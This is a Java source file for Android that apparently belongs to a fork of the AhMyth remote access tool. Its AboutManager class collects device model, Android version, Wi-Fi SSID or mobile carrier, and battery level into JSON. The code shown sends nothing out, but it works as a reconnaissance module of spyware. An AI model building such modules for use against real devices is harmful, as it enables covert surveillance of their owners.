package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import org.json.JSONObject;
import org.json.JSONException;

/**
 * AboutManager collects device info, network info, and battery info.
 */
public class AboutManager {

    public static JSONObject getAboutInfo(Context context) {
        JSONObject about = new JSONObject();

        try {
            // 1️⃣ Device Info
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            deviceInfo.put("sdkInt", Build.VERSION.SDK_INT);
            about.put("deviceInfo", deviceInfo);

            // 2️⃣ Network Info
            JSONObject networkInfo = new JSONObject();
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);

            if (cm != null) {
                NetworkCapabilities nc = cm.getNetworkCapabilities(cm.getActiveNetwork());
                if (nc != null) {
                    if (nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                        WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                        String ssid = (wifiManager != null && wifiManager.getConnectionInfo() != null)
                                ? wifiManager.getConnectionInfo().getSSID()
                                : "Unknown WiFi";
                        networkInfo.put("type", "WIFI");
                        networkInfo.put("ssid", ssid);
                    } else if (nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                        String carrier = (tm != null) ? tm.getSimOperatorName() : "Unknown Carrier";
                        networkInfo.put("type", "CELLULAR");
                        networkInfo.put("carrier", carrier);
                    } else {
                        networkInfo.put("type", "UNKNOWN");
                    }
                }
            }
            about.put("networkInfo", networkInfo);

            // 3️⃣ Battery Info
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            int level = -1;
            if (bm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                }
            }
            JSONObject batteryInfo = new JSONObject();
            batteryInfo.put("level", level >= 0 ? level : "Unknown");
            about.put("batteryInfo", batteryInfo);

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return about;
    }
}
